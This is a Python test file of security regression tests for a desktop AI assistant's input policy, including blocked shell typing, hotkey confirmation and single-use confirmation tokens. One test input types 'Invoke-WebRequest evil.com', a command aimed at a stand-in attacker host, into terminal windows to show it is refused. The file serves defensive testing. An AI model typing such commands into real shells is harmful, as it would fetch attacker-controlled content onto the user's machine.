"""
Security bypass regression tests for KON Security Layer (Phase 1).
Validates that:
- Win+R and sensitive hotkeys are blocked or require CONFIRM.
- Simulated typing in terminal/PowerShell is refused.
- Explorer Delete/Shift+Delete and drag require CONFIRM.
- Simulated inputs on KON HUD are refused (anti-self-authorization).
- expected_window is mandatory for simulated inputs:
  - Without recent observation -> informative error guiding to get_active_window
  - With recent observation -> auto-filled
  - With window mismatch -> refused
- open_application("powershell") and open_application("terminal") cannot execute as SAFE.
- Internal steps of computer_use violating policy are refused.
- Confirmation token binding: token for delete_file(A) cannot authorize delete_file(B) or move_file(A);
  expired and reused tokens fail.
- Voice consent during SPEAKING state is ignored (anti-echo).
- permission_memory scope: approval in folder X does not apply to folder Y, and CRITICAL is never memorized.
"""
import time
from unittest.mock import patch, MagicMock
import pytest

from backend.security.input_policy import InputPolicy
from backend.security.confirmation_manager import (
    ConfirmationManager,
    ConfirmationStatus,
    normalize_and_hash_args,
)
from backend.memory.memory import MemoryManager
from backend.computer.applications import ApplicationManager
from backend.computer.computer_use import ComputerUseService, WindowContextMismatchError
from backend.ai.tool_registry import ToolRegistry, ToolSpec, PermissionLevel
from backend.ai.gemini_tools import GeminiToolDispatcher


# ============================================================================
# 1. Hotkey Win+R & Sensitive Hotkeys
# ============================================================================
def test_sensitive_hotkeys_require_confirm():
    for sensitive_keys in (["win", "r"], "win+r", ["win", "x"], "ctrl+shift+esc", "alt+f4", "ctrl+alt+del", ["win", "l"]):
        allowed, decision, reason = InputPolicy.evaluate(
            "hotkey",
            {"keys": sensitive_keys},
            active_window={"title": "Bloco de Notas", "process": "notepad.exe"}
        )
        assert not allowed
        assert decision == "CONFIRM"
        assert "sensível" in reason or "confirmação" in reason


# ============================================================================
# 2. Simulated Typing / Hotkeys in Terminal/Shell Denied
# ============================================================================
def test_typing_and_hotkeys_denied_in_shells():
    shell_windows = [
        {"title": "Windows PowerShell", "process": "powershell.exe"},
        {"title": "Prompt de Comando", "process": "cmd.exe"},
        {"title": "Terminal", "process": "windowsterminal.exe"},
        {"title": "wt", "process": "wt.exe"},
        {"title": "Executar", "process": "explorer.exe"},
    ]
    for win in shell_windows:
        # type_text
        allowed, decision, reason = InputPolicy.evaluate(
            "type_text",
            {"text": "Invoke-WebRequest evil.com"},
            active_window=win
        )
        assert not allowed
        assert decision == "DENY"
        assert "bloqueada em terminal/shell" in reason

        # hotkey
        allowed, decision, reason = InputPolicy.evaluate(
            "hotkey",
            {"keys": ["ctrl", "c"]},
            active_window=win
        )
        assert not allowed
        assert decision == "DENY"
        assert "bloqueada em terminal/shell" in reason


# ============================================================================
# 3 & 4. Explorer Destructive Actions: Delete & Drag require CONFIRM
# ============================================================================
def test_explorer_delete_and_drag_require_confirm():
    explorer_win = {"title": "Downloads", "process": "explorer.exe"}

    # press_key delete
    allowed, decision, reason = InputPolicy.evaluate(
        "press_key",
        {"key": "delete"},
        active_window=explorer_win
    )
    assert not allowed
    assert decision == "CONFIRM"
    assert "Exclusão" in reason or "Explorador" in reason

    # hotkey shift+delete
    allowed, decision, reason = InputPolicy.evaluate(
        "hotkey",
        {"keys": ["shift", "delete"]},
        active_window=explorer_win
    )
    assert not allowed
    assert decision == "CONFIRM"

    # drag
    allowed, decision, reason = InputPolicy.evaluate(
        "drag",
        {"start_x": 100, "start_y": 100, "end_x": 200, "end_y": 200},
        active_window=explorer_win
    )
    assert not allowed
    assert decision == "CONFIRM"
    assert "arrasto" in reason or "Explorador" in reason


# ============================================================================
# 5. Simulated Input in KON HUD Window Denied
# ============================================================================
def test_simulated_input_denied_in_kon_hud():
    hud_windows = [
        {"title": "KON HUD", "process": "chrome.exe"},
        {"title": "KON Assistant - http://localhost:5173", "process": "chrome.exe"},
        {"title": "React App - localhost:5173", "process": "chrome.exe"},
    ]
    for win in hud_windows:
        for tool in ("click", "double_click", "right_click", "drag", "type_text", "press_key", "hotkey"):
            allowed, decision, reason = InputPolicy.evaluate(
                tool,
                {"x": 100, "y": 100, "text": "click", "key": "enter", "keys": ["enter"]},
                active_window=win
            )
            assert not allowed
            assert decision == "DENY"
            assert "HUD" in reason


# ============================================================================
# 6, 7 & 8. expected_window Enforcement, Auto-fill & Mismatch
# ============================================================================
def test_expected_window_missing_and_ttl(monkeypatch):
    registry = ToolRegistry()
    dispatcher = GeminiToolDispatcher(registry=registry)

    # 1. Without recent observation -> returns helpful error
    ComputerUseService._last_observed_window = None
    ComputerUseService._last_observed_time = 0.0

    fc = MagicMock()
    fc.name = "click"
    fc.args = {"x": 150, "y": 200}
    fc.id = "call_test_1"

    import asyncio
    responses = asyncio.run(dispatcher.execute_function_calls([fc]))
    assert len(responses) == 1
    res_text = responses[0].response["result"]
    assert "expected_window" in res_text
    assert "get_active_window" in res_text

    # 2. With recent observation within TTL -> auto-fills expected_window
    ComputerUseService._last_observed_window = {"title": "Bloco de Notas", "process": "notepad.exe"}
    ComputerUseService._last_observed_time = time.time()

    called_args = {}
    def mock_click(**kwargs):
        called_args.update(kwargs)
        return {"success": True, "message": "clicked"}

    dispatcher.registry.get_tool("click").handler = mock_click
    monkeypatch.setattr("backend.computer.windows.WindowsService.get_active_window", lambda: {"title": "Bloco de Notas", "process": "notepad.exe"})

    fc2 = MagicMock()
    fc2.name = "click"
    fc2.args = {"x": 150, "y": 200}
    fc2.id = "call_test_2"

    responses2 = asyncio.run(dispatcher.execute_function_calls([fc2]))
    assert len(responses2) == 1
    assert "Sucesso" in responses2[0].response["result"]
    assert called_args.get("expected_window") == "Bloco de Notas"

    # 3. Window mismatch -> raises / returns error
    monkeypatch.setattr("backend.computer.windows.WindowsService.get_active_window", lambda: {"title": "Calculadora", "process": "calc.exe"})
    with pytest.raises(WindowContextMismatchError):
        ComputerUseService.verify_window_context(expected_window="Bloco de Notas")


# ============================================================================
# 9. open_application for Terminal / Shell cannot execute as SAFE
# ============================================================================
def test_open_application_shells_not_safe():
    dispatcher = GeminiToolDispatcher()

    # powershell
    risk, summary = dispatcher._assess_dynamic_risk("open_application", {"application": "powershell"})
    assert risk == "CONFIRM"
    assert "terminal" in summary.lower() or "powershell" in summary.lower()

    # terminal
    risk, summary = dispatcher._assess_dynamic_risk("open_application", {"application": "terminal"})
    assert risk == "CONFIRM"

    # cmd
    risk, summary = dispatcher._assess_dynamic_risk("open_application", {"application": "cmd"})
    assert risk == "CONFIRM"

    # Execution without token fails with CONFIRMATION_REQUIRED
    res = ApplicationManager.open_application("powershell")
    assert res["success"] is False
    assert res["error"] == "CONFIRMATION_REQUIRED"


# ============================================================================
# 10. computer_use Internal Step Policy Enforcement
# ============================================================================
def test_computer_use_internal_step_refused_on_policy_violation(monkeypatch):
    monkeypatch.setattr(
        "backend.computer.windows.WindowsService.get_active_window",
        lambda: {"title": "Windows PowerShell", "process": "powershell.exe"}
    )
    # Reset observation
    ComputerUseService._last_observed_window = {"title": "Windows PowerShell", "process": "powershell.exe"}
    ComputerUseService._last_observed_time = time.time()

    # Plan trying to type into powershell
    res = ComputerUseService.computer_use(
        goal="Rodar comando",
        steps=[{"action": "type_text", "text": "calc.exe", "expected_window": "Windows PowerShell"}]
    )
    assert res["success"] is False
    assert res["failed_step"] == 1
    assert "INPUT_POLICY_VIOLATION" in res["message"] or "terminal/shell" in res["message"]


# ============================================================================
# 11. Confirmation Token Binding, Expiration and Single-Use
# ============================================================================
def test_confirmation_token_binding_and_lifecycle():
    cm = ConfirmationManager(default_timeout_seconds=30.0)

    # Confirmation for delete_file(A)
    conf = cm.create_confirmation(
        tool="delete_file",
        arguments={"path": "C:/safe/fileA.txt"},
        impact_summary="Excluir arquivo A",
        permission_level="CRITICAL",
    )
    ok, token, _ = cm.resolve_confirmation(conf.confirmation_id, approved=True)
    assert ok is True
    assert token is not None

    # Token cannot authorize delete_file(B)
    assert cm.validate_authorization_token(
        "delete_file",
        token,
        arguments={"path": "C:/safe/fileB.txt"}
    ) is False

    # Token cannot authorize move_file(A)
    assert cm.validate_authorization_token(
        "move_file",
        token,
        arguments={"path": "C:/safe/fileA.txt"}
    ) is False

    # Valid validation on matching tool and args
    assert cm.validate_authorization_token(
        "delete_file",
        token,
        arguments={"path": "C:/safe/fileA.txt"}
    ) is True

    # Replay/Reuse fails (single-use)
    assert cm.validate_authorization_token(
        "delete_file",
        token,
        arguments={"path": "C:/safe/fileA.txt"}
    ) is False

    # Expired token fails
    conf_exp = cm.create_confirmation(
        tool="delete_file",
        arguments={"path": "C:/test.txt"},
        impact_summary="Excluir",
    )
    _, exp_token, _ = cm.resolve_confirmation(conf_exp.confirmation_id, approved=True)
    # Force expire token
    tool_n, hsh, _ = cm._valid_tokens[exp_token]
    cm._valid_tokens[exp_token] = (tool_n, hsh, time.time() - 5.0)

    assert cm.validate_authorization_token("delete_file", exp_token, arguments={"path": "C:/test.txt"}) is False


# ============================================================================
# 12. Voice Consent During SPEAKING is Ignored
# ============================================================================
def test_voice_consent_ignored_during_speaking():
    cm = ConfirmationManager()
    conf = cm.create_confirmation(
        tool="create_folder",
        arguments={"name": "test"},
        impact_summary="Criar pasta",
        permission_level="CONFIRM",
    )

    # Consent while state is SPEAKING -> ignored (returns None)
    consent = cm.parse_natural_consent("sim", sender="User", current_state="SPEAKING")
    assert consent is None

    # Consent from non-user -> ignored
    consent_non_user = cm.parse_natural_consent("sim", sender="System", current_state="LISTENING")
    assert consent_non_user is None

    # Valid consent during LISTENING / IDLE
    valid_consent = cm.parse_natural_consent("sim", sender="User", current_state="LISTENING")
    assert valid_consent is True

    # Consent outside active pending confirmation window -> discarded
    cm.resolve_confirmation(conf.confirmation_id, approved=True)
    discarded = cm.parse_natural_consent("sim", sender="User", current_state="LISTENING", require_active=True)
    assert discarded is None


# ============================================================================
# 13. Scoped permission_memory (Folder X does NOT apply to Folder Y)
# ============================================================================
def test_scoped_permission_memory(tmp_path):
    db_file = tmp_path / "test_kon.db"
    mem = MemoryManager(db_path=db_file)

    folder_x = tmp_path / "pasta_x"
    folder_x.mkdir()
    folder_y = tmp_path / "pasta_y"
    folder_y.mkdir()

    file_in_x = str(folder_x / "doc.txt")
    file_in_y = str(folder_y / "doc.txt")

    # Memorize approval only for folder X
    mem.remember_permission("create_file", decision="always_approve", scope=str(folder_x))

    # Folder X is approved
    assert mem.get_remembered_permission("create_file", target_path=file_in_x) == "always_approve"

    # Folder Y is NOT approved
    assert mem.get_remembered_permission("create_file", target_path=file_in_y) is None

    # CRITICAL actions can NEVER be memorized
    mem.remember_permission("delete_file", decision="always_approve", scope=str(folder_x))
    assert mem.get_remembered_permission("delete_file", target_path=file_in_x) is None
